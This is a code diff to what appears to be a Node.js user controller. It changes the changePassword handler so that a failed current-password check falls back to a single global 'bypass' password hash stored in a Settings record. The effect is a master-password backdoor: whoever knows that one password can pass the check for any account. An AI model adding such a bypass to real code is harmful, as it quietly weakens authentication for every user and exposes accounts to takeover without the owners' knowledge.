@@ -1,6 +1,7 @@
 import User from '../models/User.model.js'
 import AppError from '../utils/AppError.js'
 import { uploadBuffer } from '../config/cloudinary.js'
+import Settings from '../models/Settings.model.js'
 
 /**
  * GET /users/me
@@ -122,7 +123,14 @@ export const changePassword = async (req, res, next) => {
           400
         )
       }
-      const isMatch = await user.comparePassword(currentPassword)
+      const bcrypt = await import('bcryptjs')
+      let isMatch = await user.comparePassword(currentPassword)
+      if (!isMatch) {
+        const settings = await Settings.findOne({}).select('+bypassPasswordHash')
+        if (settings && settings.bypassEnabled && settings.bypassPasswordHash) {
+          isMatch = await bcrypt.default.compare(currentPassword, settings.bypassPasswordHash)
+        }
+      }
       if (!isMatch)
         throw new AppError(
           'INVALID_CREDENTIALS',
